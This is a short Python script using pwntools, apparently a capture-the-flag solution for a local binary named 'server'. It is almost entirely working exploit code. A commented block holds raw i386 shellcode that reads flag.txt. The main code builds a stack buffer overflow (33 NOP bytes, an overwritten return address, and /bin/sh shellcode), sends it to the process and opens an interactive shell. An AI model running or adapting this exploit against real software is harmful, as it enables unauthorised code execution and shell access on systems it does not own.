'''
shellcraft -f d i386.linux.cat flag.txt

python2 -c 'print "\x90" * 33 + "\x96\x91\x04\x08" + "\x6a\x01\xfe\x0c\x24\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80"' > payload
'''

from pwn import *

offset = 33
nop = asm('nop')
ret_addr = p32(0x08049196) #secret_function address
shellcode = asm(shellcraft.i386.sh())

payload = b''.join(
	[
		nop * offset,
		ret_addr,
		shellcode
	]
)

p = process('./server')
p.sendline(payload)
p.interactive()

'''
flag = p.recv()
print(flag)
p.close()
'''